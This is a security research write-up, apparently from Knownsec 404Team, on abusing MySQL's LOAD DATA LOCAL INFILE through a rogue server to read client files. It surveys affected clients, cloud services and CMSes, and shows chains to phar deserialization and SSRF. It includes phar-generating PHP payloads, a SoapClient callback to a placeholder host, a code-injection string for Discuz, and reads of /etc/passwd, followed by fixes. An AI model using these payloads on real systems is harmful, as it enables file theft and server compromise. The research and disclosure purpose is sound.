---
title: CSS-T | Mysql Client 任意文件读取攻击链拓展
date: 2020-01-14 14:11:38
tags: mysql
---

author: LoRexxar@Knownsec 404Team & Dawu@Knownsec 404Team

这应该是一个很早以前就爆出来的漏洞，而我见到的时候是在TCTF2018 final线下赛的比赛中，是被 Dragon Sector 和 Cykor 用来非预期h4x0r's club这题的一个技巧。

[http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

在后来的研究中，和@Dawu的讨论中顿时觉得这应该是一个很有趣的trick，在逐渐追溯这个漏洞的过去的过程中，我渐渐发现这个问题作为mysql的一份feature存在了很多年，从13年就有人分享这个问题。

- [Database Honeypot by design (2013 8月 Presentation from Yuri Goltsev)](https://www.slideshare.net/qqlan/database-honeypot-by-design-25195927)
- [Rogue-MySql-Server Tool (2013年 9月 MySQL fake server to read files of connected clients)](https://github.com/Gifts/Rogue-MySql-Server)
- [Abusing MySQL LOCAL INFILE to read client files (2018年4月23日)](https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html)

在围绕这个漏洞的挖掘过程中，我们不断地发现新的利用方式，所以将其中大部分的发现都总结并准备了议题在CSS上分享，下面让我们来一步步分析。

# Load data infile

load data infile是一个很特别的语法，熟悉注入或者经常打CTF的朋友可能会对这个语法比较熟悉，在CTF中，我们经常能遇到没办法load_file读取文件的情况，这时候唯一有可能读到文件的就是load data infile，一般我们常用的语句是这样的：

```
load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```

mysql server会读取服务端的/etc/passwd然后将数据按照`'\n'`分割插入表中，但现在这个语句同样要求你有FILE权限，以及非local加载的语句也受到`secure_file_priv`的限制

```
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

如果我们修改一下语句，加入一个关键字local。
```
mysql> load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
Query OK, 11 rows affected, 11 warnings (0.01 sec)
Records: 11  Deleted: 0  Skipped: 0  Warnings: 11
```

加了local之后，这个语句就成了，读取客户端的文件发送到服务端，上面那个语句执行结果如下

![image.png-73.1kB][1]

很显然，这个语句是不安全的，在mysql的文档里也充分说明了这一点

[https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html](https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html)

在mysql文档中的说到，**服务端可以要求客户端读取有可读权限的任何文件**。

mysql认为**客户端不应该连接到不可信的服务端**。

![image.png-83kB][2]

我们今天的这个问题，就是围绕这个基础展开的。

# 构造恶意服务端

在思考明白了前面的问题之后，核心问题就成了，我们怎么构造一个恶意的mysql服务端。

在搞清楚这个问题之前，我们需要研究一下mysql正常执行链接和查询的数据包结构。

1、greeting包，服务端返回了banner，其中包含mysql的版本

![OXDM5E5$ST51[$0B`@BBG~S.png-173.1kB][3]

2、客户端登陆请求
![image.png-94.5kB][4]

3、然后是初始化查询，这里因为是phpmyadmin所以初始化查询比较多
![image.png-86.4kB][5]

4、load file local

由于我的环境在windows下，所以这里读取为`C:/Windows/win.ini`，语句如下

```
load data local infile "C:/Windows/win.ini" into table test FIELDS TERMINATED BY '\n';
```

首先是客户端发送查询

![image.png-88.4kB][6]

然后服务端返回了需要的路径

![image.png-113kB][7]

然后客户端直接把内容发送到了服务端

![image.png-130.1kB][8]

看起来流程非常清楚，而且客户端读取文件的路径并不是从客户端指定的，而是发送到服务端，服务端制定的。

原本的查询流程为
```
客户端：我要把win.ini插入test表中
服务端：我要你的win.ini内容
客户端：win.ini的内容如下....
```

假设服务端由我们控制，把一个正常的流程篡改成如下
```
客户端：我要test表中的数据
服务端：我要你的win.ini内容
客户端：win.ini的内容如下???
```
上面的第三句究竟会不会执行呢？

让我们回到[mysql的文档](https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html)中，文档中有这么一句话：
![image.png-109.4kB][9]

**服务端可以在任何查询语句后回复文件传输请求**，也就是说我们的想法是成立的

在深入研究漏洞的过程中，不难发现这个漏洞是否成立在于Mysql client端的配置问题，而经过一番研究，我发现在mysql登陆验证的过程中，会发送客户端的配置。

![image.png-200.6kB][10]

在greeting包之后，客户端就会链接并试图登陆，同时数据包中就有关于是否允许使用load data local的配置，可以从这里直白的看出来客户端是否存在这个问题（这里返回的客户端配置不一定是准确的，后面会提到这个问题）。

# poc

在想明白原理之后，构建恶意服务端就变得不那么难了，流程很简单
1、回复mysql client一个greeting包
2、等待client端发送一个查询包
3、回复一个file transfer包

这里主要是构造包格式的问题，可以跟着原文以及各种文档完成上述的几次查询.

值得注意的是，原作者给出的poc并没有适配所有的情况，部分mysql客户端会在登陆成功之后发送ping包，如果没有回复就会断开连接。也有部分mysql client端对greeting包有较强的校验，建议直接抓包按照真实包内容来构造。

- [https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake](https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake)
- [https://dev.mysql.com/doc/internals/en/com-query-response.html](https://dev.mysql.com/doc/internals/en/com-query-response.html)

原作者给出的poc

[https://github.com/Gifts/Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server)

# 演示

这里用了一台腾讯云做服务端，客户端使用phpmyadmin连接

![image.png-148.4kB][11]

![image.png-98.3kB][12]

我们成功读取了文件。

# 影响范围

## 底层应用

在这个漏洞到底有什么影响的时候，我们首先必须知道到底有什么样的客户端受到这个漏洞的威胁。

- mysql client (pwned)
- php mysqli (pwned，fixed by 7.3.4)
- php pdo (默认禁用)
- python MySQLdb (pwned)
- python mysqlclient (pwned)
- java JDBC Driver (pwned，部分条件下默认禁用)
- navicat （pwned)

## 探针

在深入挖掘这个漏洞的过程中，第一时间想到的利用方式就是mysql探针，但可惜的是，在测试了市面上的大部分探针后发现大部分的探针连接之后只接受了greeting包就断开连接了，没有任何查询，尽职尽责。

- 雅黑PHP探针 失败
- iprober2 探针 失败
- PHP探针 for LNMP一键安装包  失败
- UPUPW PHP 探针 失败
- ...

## 云服务商 云数据库 数据迁移服务

国内
- 腾讯云 DTS 失败，禁用Load data local
- 阿里云 RDS 数据迁移失败，禁用Load data local
- 华为云 RDS DRS服务 成功
![image.png-313kB][14]
![image.png-248.2kB][15]
- 京东云 RDS不支持远程迁移功能，分布式关系数据库未开放
- UCloud RDS不支持远程迁移功能，分布式关系数据库不能对外数据同步
- QiNiu云 RDS不支持远程迁移功能
- 新睿云 RDS不支持远程迁移功能
- 网易云 RDS 外部实例迁移 成功
![image.png-893.6kB][16]
- 金山云 RDS DTS数据迁移 成功
![image.png-140.8kB][17]
![image.png-299kB][18]
- 青云Cloud RDS 数据导入 失败，禁用load data local
- 百度Cloud RDS DTS 成功
![image.png-128.4kB][19]

国际云服务商
- Google could SQL数据库迁移失败，禁用Load data infile
- AWS RDS DMS服务 成功
![image.png-108.1kB][20]
![image.png-262kB][21]

## Excel online sql查询

之前的一篇文章中提到过，在Excel中一般有这样一个功能，从数据库中同步数据到表格内，这样一来就可以通过上述方式读取文件。

受到这个思路的启发，我们想到可以找online的excel的这个功能，这样就可以实现任意文件读取了。

- WPS failed（没找到这个功能）
- Microsoft excel failed（禁用了infile语句）
- Google 表格 （原生没有这个功能，但却支持插件，下面主要说插件）
    - Supermetrics pwned
    ![image.png-121.5kB][22]
    ![image.png-120.6kB][23]
    - Advanced CFO Solutions MySQL Query failed
    - SeekWell failed
    - Skyvia Query Gallery failed
    - database Borwser failed
    - Kloudio pwned
    ![image.png-133.9kB][24]
    

# 拓展？2RCE！

抛开我们前面提的一些很特殊的场景下，我们也要讨论一些这个漏洞在通用场景下的利用攻击链。

既然是围绕任意文件读取来讨论，那么最能直接想到的一定是有关配置文件的泄露所导致的漏洞了。

## 任意文件读 with 配置文件泄露

在Discuz x3.4的配置中存在这样两个文件
```
config/config_ucenter.php
config/config_global.php
```

在dz的后台，有一个ucenter的设置功能，这个功能中提供了ucenter的数据库服务器配置功能，通过配置数据库链接恶意服务器，可以实现任意文件读取获取配置信息。
![image.png-230kB][25]

配置ucenter的访问地址。
```
原地址： http://localhost:8086/upload/uc_server
修改为： http://localhost:8086/upload/uc_server\');phpinfo();//
```

当我们获得了authkey之后，我们可以通过admin的uid以及盐来计算admin的cookie。然后用admin的cookie以及`UC_KEY`来访问即可生效
![image.png-289.7kB][26]


## 任意文件读 to 反序列化

2018年BlackHat大会上的Sam Thomas分享的File Operation Induced Unserialization via the “phar://” Stream Wrapper议题，原文[https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf ](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf )。

在该议题中提到，在PHP中存在一个叫做[Stream API](https://secure.php.net/manual/zh/internals2.ze1.streams.php)，通过注册拓展可以注册相应的伪协议，而phar这个拓展就注册了`phar://`这个stream wrapper。

在我们知道创宇404实验室安全研究员seaii曾经的研究([https://paper.seebug.org/680/](https://paper.seebug.org/680/))中表示，所有的文件函数都支持stream wrapper。

![image.png-39.7kB][27]


深入到函数中，我们可以发现，可以支持steam wrapper的原因是调用了
```
stream = php_stream_open_wrapper_ex(filename, "rb" ....);
```

从这里，我们再回到mysql的load file local语句中，在mysqli中，mysql的读文件是通过php的函数实现的

```
https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c#L43-L52

if (PG(open_basedir)) {
		if (php_check_open_basedir_ex(filename, 0) == -1) {
			strcpy(info->error_msg, "open_basedir restriction in effect. Unable to open file");
			info->error_no = CR_UNKNOWN_ERROR;
			DBG_RETURN(1);
		}
	}

	info->filename = filename;
	info->fd = php_stream_open_wrapper_ex((char *)filename, "r", 0, NULL, context);
```

也同样调用了`php_stream_open_wrapper_ex`函数，也就是说，我们同样可以通过读取phar文件来触发反序列化。

### 复现

首先需要一个生成一个phar

```
pphar.php

<?php
class A {
    public $s = '';
    public function __wakeup () {
        echo "pwned!!";
    }
}


@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a "."<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new A();
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

使用该文件生成一个phar.phar

然后我们模拟一次查询
```
test.php

<?php
class A {
    public $s = '';
    public function __wakeup () {
        echo "pwned!!";
    }
}


$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, '{evil_mysql_ip}', 'root', '123456', 'test', 3667);
$p = mysqli_query($m, 'select 1;');

// file_get_contents('phar://./phar.phar');
```

图中我们只做了select 1查询，但我们伪造的evil mysql server中驱使mysql client去做`load file local`查询，读取了本地的
```
phar://./phar.phar
```

成功触发反序列化
![image.png-33.1kB][28]


## 反序列化 to RCE

当一个反序列化漏洞出现的时候，我们就需要从源代码中去寻找合适的pop链，建立在pop链的利用基础上，我们可以进一步的扩大反序列化漏洞的危害。

php序列化中常见的魔术方法有以下
- 当对象被创建的时候调用：__construct
- 当对象被销毁的时候调用：__destruct
- 当对象被当作一个字符串使用时候调用：__toString
- 序列化对象之前就调用此方法(其返回需要是一个数组)：__sleep
- 反序列化恢复对象之前就调用此方法：__wakeup
- 当调用对象中不存在的方法会自动调用此方法：__call

配合与之相应的pop链，我们就可以把反序列化转化为RCE。



### dedecms 后台反序列化漏洞 to SSRF

dedecms 后台，模块管理，安装UCenter模块。开始配置

![image.png-537.2kB][31]

首先需要找一个确定的UCenter服务端，可以通过找一个dz的站来做服务端。

![image.png-356.7kB][32]

然后就会触发任意文件读取，当然，如果读取文件为phar，则会触发反序列化。

我们需要先生成相应的phar
```
<?php

class Control
{
    var $tpl;
    // $a = new SoapClient(null,array('uri'=>'http://example.com:5555', 'location'=>'http://example.com:5555/aaa'));
    public $dsql;

    function __construct(){
		$this->dsql = new SoapClient(null,array('uri'=>'http://xxxx:5555', 'location'=>'http://xxxx:5555/aaa'));
	}

    function __destruct() {
        unset($this->tpl);
        $this->dsql->Close(TRUE);
    }
}

@unlink("dedecms.phar");
$phar = new Phar("dedecms.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
$o = new Control();
$phar->setMetadata($o); //将自定义meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

?>
```

然后我们可以直接通过前台上传头像来传文件，或者直接后台也有文件上传接口，然后将rogue mysql server来读取这个文件

```
phar://./dedecms.phar/test.txt
```

监听5555可以收到
![image.png-38.9kB][33]

ssrf进一步可以攻击redis等拓展攻击面，就不多说了。



## 部分CMS测试结果

| CMS名      | 影响版本 | 是否存在mysql任意文件读取 | 是否有可控的MySQL服务器设置       | 是否有可控的反序列化 | 是否可上传phar | 补丁                                                         |
| ---------- | -------- | ------------------------- | --------------------------------- | -------------------- | -------------- | ------------------------------------------------------------ |
| phpmyadmin | < 4.8.5  | 是                        | 是                                | 是                   | 是             | [补丁](https://github.com/phpmyadmin/phpmyadmin/commit/828f740158e7bf14aa4a7473c5968d06364e03a2) |
| Dz         | 未修复   | 是                        | 是                                | 否                   | None           | None                                                         |
| drupal     | None     | 否(使用PDO)               | 否(安装)                          | 是                   | 是             | None                                                         |
| dedecms    | None     | 是                        | 是(ucenter)                       | 是(ssrf)             | 是             | None                                                         |
| ecshop     | None     | 是                        | 是                                | 否                   | 是             | None                                                         |
| 禅道       | None     | 否(PDO)                   | 否                                | None                 | None           | None                                                         |
| phpcms     | None     | 是                        | 是                                | 是(ssrf)             | 是             | None                                                         |
| 帝国cms    | None     | 是                        | 是                                | 否                   | None           | None                                                         |
| phpwind    | None     | 否(PDO)                   | 是                                | None                 | None           | None                                                         |
| mediawiki  | None     | 是                        | 否（后台没有修改mysql配置的方法） | 是                   | 是             | None                                                         |
| Z-Blog     | None     | 是                        | 否（后台没有修改mysql配置的方法） | 是                   | 是             | None                                                         |


# 修复方式

对于大多数mysql的客户端来说，load file local是一个无用的语句，他的使用场景大多是用于传输数据或者上传数据等。对于客户端来说，可以直接关闭这个功能，并不会影响到正常的使用。

具体的关闭方式见文档
- [https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html](https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html)

对于不同服务端来说，这个配置都有不同的关法，对于JDBC来说，这个配置叫做`allowLoadLocalInfile`

- [https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-configuration-properties.html](https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-configuration-properties.html)

在php的mysqli和mysql两种链接方式中，底层代码直接决定了这个配置。

![image.png-1164.5kB][43]

这个配置是`PHP_INI_SYSTEM`，在php的文档中，这个配置意味着`Entry can be set in php.ini or httpd.conf`。

所以只有在php.ini中修改`mysqli.allow_local_infile = Off`就可以修复了。

在php7.3.4的更新中，mysqli中这个配置也被默认修改为关闭

[https://github.com/php/php-src/commit/2eaabf06fc5a62104ecb597830b2852d71b0a111#diff-904fc143c31bb7dba64d1f37ce14a0f5](https://github.com/php/php-src/commit/2eaabf06fc5a62104ecb597830b2852d71b0a111#diff-904fc143c31bb7dba64d1f37ce14a0f5)

![image.png-59.7kB][44]

可惜在不再更新的旧版本mysql5.6中，无论是mysql还是mysqli默认都为开启状态。

现在的代码中也可以通过`mysqli_option`，在链接前配置这个选项。

[http://php.net/manual/zh/mysqli.options.php](http://php.net/manual/zh/mysqli.options.php)

![image.png-116.8kB][45]

比较有趣的是，通过这种方式修复，虽然禁用了`allow_local_infile`，但是如果使用wireshark抓包却发现`allow_local_infile`仍是启动的（但是无效）。

在旧版本的phpmyadmin中，先执行了`mysqli_real_connect`，然后设置`mysql_option`，这样一来`allow_local_infile`实际上被禁用了，但是在发起链接请求时中`allow_local_infile`还没有被禁用。

实际上是因为`mysqli_real_connect`在执行的时候，会初始化`allow_local_infile`。在php代码底层`mysqli_real_connect`实际是执行了`mysqli_common_connect`。而在`mysqli_common_connect`的代码中，设置了一次`allow_local_infile`。

[https://github.com/php/php-src/blob/ca8e2abb8e21b65a762815504d1fb3f20b7b45bc/ext/mysqli/mysqli_nonapi.c#L251](https://github.com/php/php-src/blob/ca8e2abb8e21b65a762815504d1fb3f20b7b45bc/ext/mysqli/mysqli_nonapi.c#L251)

![image.png-21.5kB][46]

如果在`mysqli_real_connect`之前设置`mysql_option`，其`allow_local_infile`的配置会被覆盖重写，其修改就会无效。

phpmyadmin在1月22日也正是通过交换两个函数的相对位置来修复了该漏洞。
[https://github.com/phpmyadmin/phpmyadmin/commit/c5e01f84ad48c5c626001cb92d7a95500920a900#diff-cd5e76ab4a78468a1016435eed49f79f](https://github.com/phpmyadmin/phpmyadmin/commit/c5e01f84ad48c5c626001cb92d7a95500920a900#diff-cd5e76ab4a78468a1016435eed49f79f)



# 说在最后

这是一个针对mysql feature的攻击模式，思路非常有趣，就目前而言在mysql层面没法修复，只有在客户端关闭了这个配置才能避免印象。虽然作为攻击面并不是很广泛，但可能针对一些特殊场景的时候，可以特别有效的将一个正常的功能转化为任意文件读取，在拓展攻击面上非常的有效。

详细的攻击场景这里就不做假设了，危害还是比较大的。

# REF
- [http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)
- [https://lightless.me/archives/read-mysql-client-file.html](https://lightless.me/archives/read-mysql-client-file.html)
- [https://dev.mysql.com/doc/refman/8.0/en/load-data.html](https://dev.mysql.com/doc/refman/8.0/en/load-data.html)
- [https://dev.mysql.com/doc/refman/8.0/en/load-data.html](https://dev.mysql.com/doc/refman/8.0/en/load-data.html)


[1]: http://static.zybuluo.com/LoRexxar/3t0iv2wtgra8pjxb3hlgv4ao/image.png
[2]: http://static.zybuluo.com/LoRexxar/n0rx8iobd8fxtx5dunos7km3/image.png
[3]: http://static.zybuluo.com/LoRexxar/4x1yyuqbcnugcbqvzofcs3pp/OXDM5E5$ST51%5B$0B%60@BBG~S.png
[4]: http://static.zybuluo.com/LoRexxar/eqng4m7z35a0b7qclj1jmg21/image.png
[5]: http://static.zybuluo.com/LoRexxar/7yori2fkfjl9dlmgtussxdd4/image.png
[6]: http://static.zybuluo.com/LoRexxar/m6gjcjz5w63tnh79jjl2id7k/image.png
[7]: http://static.zybuluo.com/LoRexxar/bl2bviwpwbj3xbkd9ehp258g/image.png
[8]: http://static.zybuluo.com/LoRexxar/7sx4ebpx0xtchs4lj0qvo09k/image.png
[9]: http://static.zybuluo.com/LoRexxar/tobzz9kf0ikfp3h5jqi07m4i/image.png
[10]: http://static.zybuluo.com/LoRexxar/b4xa1b2s05wue6o04k7i1wfw/image.png
[11]: http://static.zybuluo.com/LoRexxar/ock8gpk4wjufrzu434o4sh2e/image.png
[12]: http://static.zybuluo.com/LoRexxar/qwoi5pnwgiw1lmdcx5e7836b/image.png
[13]: http://static.zybuluo.com/LoRexxar/ub5d1ylbd28m9o8zalt4cnto/image.png
[14]: http://static.zybuluo.com/LoRexxar/dfs1q3dm1i6r10mjywgpp819/image.png
[15]: http://static.zybuluo.com/LoRexxar/mrqd72185373870f6wrdas8a/image.png
[16]: http://static.zybuluo.com/LoRexxar/y0x18uc96fwpov4bqn0qhhqj/image.png
[17]: http://static.zybuluo.com/LoRexxar/lwmbbklsfgdti60e8qyjqtw7/image.png
[18]: http://static.zybuluo.com/LoRexxar/72iqa6e7i3928wckfuacxiny/image.png
[19]: http://static.zybuluo.com/LoRexxar/ijivo1toa7afcm4gug7tjzk5/image.png
[20]: http://static.zybuluo.com/LoRexxar/0adbu75qrcuv8caau262m34i/image.png
[21]: http://static.zybuluo.com/LoRexxar/6orndbdfrf1bqysouez1uauj/image.png
[22]: http://static.zybuluo.com/LoRexxar/ciy78f57vftzichc3xg82qgd/image.png
[23]: http://static.zybuluo.com/LoRexxar/ngn1u8fu15qz5d9830lrcbhn/image.png
[24]: http://static.zybuluo.com/LoRexxar/xd6jvuhaofstoduthnb15a1w/image.png
[25]: http://static.zybuluo.com/LoRexxar/vpa6tokfa26dng7eqr8bsubc/image.png
[26]: http://static.zybuluo.com/LoRexxar/4cief0ku1991kkpavlda1lm6/image.png
[27]: http://static.zybuluo.com/LoRexxar/1dl9y4ioznpis2z2xi5ixxdd/image.png
[28]: http://static.zybuluo.com/LoRexxar/j27yhc2er961j4gqttmhwutu/image.png
[29]: http://static.zybuluo.com/LoRexxar/4dr8vlhpn5lnn8ktq1jbn2ao/image.png
[30]: http://static.zybuluo.com/LoRexxar/twls59xuylfk78j4ikrk3eii/image.png
[31]: http://static.zybuluo.com/LoRexxar/hwg8ahoh48odump72h6tf3c1/image.png
[32]: http://static.zybuluo.com/LoRexxar/4ze2by2xa8jwgbnvpquoxxt6/image.png
[33]: http://static.zybuluo.com/LoRexxar/ccwgrjox5x7nxklrtnaxaemk/image.png
[34]: http://static.zybuluo.com/LoRexxar/g5mmomxuunolwnwd69vcf567/image.png
[35]: http://static.zybuluo.com/LoRexxar/i9m3hv9246ziexne1c2d7iik/image.png
[36]: http://static.zybuluo.com/LoRexxar/notx2emuvmf7y0nd7w84sj14/image.png
[37]: http://static.zybuluo.com/LoRexxar/qe1q1zcew7fxp32gtb4ub0jh/image.png
[38]: http://static.zybuluo.com/LoRexxar/otdllmlrbgd0tygavkolgnlb/image.png
[39]: http://static.zybuluo.com/LoRexxar/4yfa4fir4mp1np0jc25gffnw/image.png
[40]: http://static.zybuluo.com/LoRexxar/g7z10bjdd0dphkwuv4k17up7/image.png
[41]: http://static.zybuluo.com/LoRexxar/w9fokrfdntuwsgf9kx9ypcqa/image.png
[42]: http://static.zybuluo.com/LoRexxar/4rfb6q9bzgunh41snsx2jqhp/image.png
[43]: http://static.zybuluo.com/LoRexxar/1xt3jcs0jaiekw13t78nxymi/image.png
[44]: http://static.zybuluo.com/LoRexxar/7yfr1ef8rzjggwaju4xyn9ld/image.png
[45]: http://static.zybuluo.com/LoRexxar/8vwz2j222q7nh07r71m12cb4/image.png
[46]: http://static.zybuluo.com/LoRexxar/7jbzoxpoon4bq9cbldg2zv8f/image.png